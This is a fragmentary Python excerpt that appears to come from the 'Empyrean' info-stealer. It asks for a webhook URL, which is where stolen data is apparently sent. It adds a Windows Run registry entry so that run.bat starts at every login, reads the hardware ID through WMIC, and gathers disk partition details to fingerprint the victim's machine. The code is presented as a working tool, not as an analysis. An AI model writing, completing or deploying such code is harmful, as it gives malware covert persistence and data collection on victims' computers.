...
webhook_url = ("Webhook URL'sini girin: ")
...
class Startup:
    ...
    def regedit(self) -> None:
        ...
        subprocess.run([
            "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "empyrean",
            "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"
        ], shell=True)
...
class SystemInfo:
        ...
        def get_hwid() -> str:
            try:
                hwid = subprocess.check_output(
                    'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True
                ).decode('utf-8').split('\n')[1].strip()
            except:
                hwid = "None"
    ...
    def disk_data(self) -> tuple[str, str, bool]:
        ...
        for part in psutil.disk_partitions(all=False):
            ...
            disk += ("{:<9} "*4).format(
                part.device, str(usage.free // (2**30)) + "GB",
                str(usage.total // (2**30)) + "GB", str(usage.percent) + "%"
            ) + "\n"
